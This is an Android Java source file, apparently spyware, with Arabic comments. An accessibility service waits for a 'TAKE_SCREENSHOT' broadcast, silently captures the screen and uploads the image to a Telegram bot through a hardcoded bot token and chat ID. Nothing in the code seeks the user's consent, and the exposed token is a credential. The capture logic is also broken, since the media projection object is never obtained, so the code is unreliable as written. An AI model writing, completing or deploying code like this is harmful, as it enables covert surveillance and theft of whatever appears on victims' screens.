package com.v8.global.sniffer;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

public class MyAccessibilityService extends AccessibilityService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private MediaProjection mediaProjection;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private OkHttpClient client = new OkHttpClient();
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        
        // استقبال أمر التقاط الشاشة
        IntentFilter filter = new IntentFilter("TAKE_SCREENSHOT");
        registerReceiver(screenshotReceiver, filter);
        
        // الحصول على مقاسات الشاشة
        WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(metrics);
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;
    }

    private BroadcastReceiver screenshotReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals("TAKE_SCREENSHOT")) {
                takeScreenshot();
            }
        }
    };

    private void takeScreenshot() {
        try {
            // إعداد ImageReader
            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
            
            // الحصول على MediaProjection
            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            
            // إنشاء Virtual Display
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenshotDisplay",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null
            );

            // التقاط الصورة بعد تأخير بسيط
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Image image = imageReader.acquireLatestImage();
                    if (image != null) {
                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * screenWidth;

                        Bitmap bitmap = Bitmap.createBitmap(
                            screenWidth + rowPadding / pixelStride,
                            screenHeight,
                            Bitmap.Config.ARGB_8888
                        );
                        bitmap.copyPixelsFromBuffer(buffer);
                        
                        // قص الصورة للحجم الصحيح
                        Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
                        
                        // إرسال الصورة إلى تليجرام
                        sendScreenshotToTelegram(croppedBitmap);
                        
                        image.close();
                        bitmap.recycle();
                        croppedBitmap.recycle();
                    }
                    
                    // تنظيف
                    if (virtualDisplay != null) {
                        virtualDisplay.release();
                        virtualDisplay = null;
                    }
                    if (imageReader != null) {
                        imageReader.close();
                        imageReader = null;
                    }
                }
            }, 500); // تأخير نصف ثانية
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendScreenshotToTelegram(Bitmap bitmap) {
        try {
            // تحويل Bitmap إلى ملف
            File file = new File(getCacheDir(), "screenshot.jpg");
            FileOutputStream fos = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
            fos.close();

            // إرسال الملف إلى تليجرام
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", "screenshot.jpg",
                            RequestBody.create(MediaType.parse("image/jpeg"), file))
                    .build();

            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
                    .post(requestBody)
                    .build();

            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(okhttp3.Call call, Response response) throws IOException {
                    response.close();
                    file.delete();
                }

                @Override
                public void onFailure(okhttp3.Call call, IOException e) {
                    e.printStackTrace();
                    file.delete();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // للاستخدام المستقبلي
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(screenshotReceiver);
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
    }
}
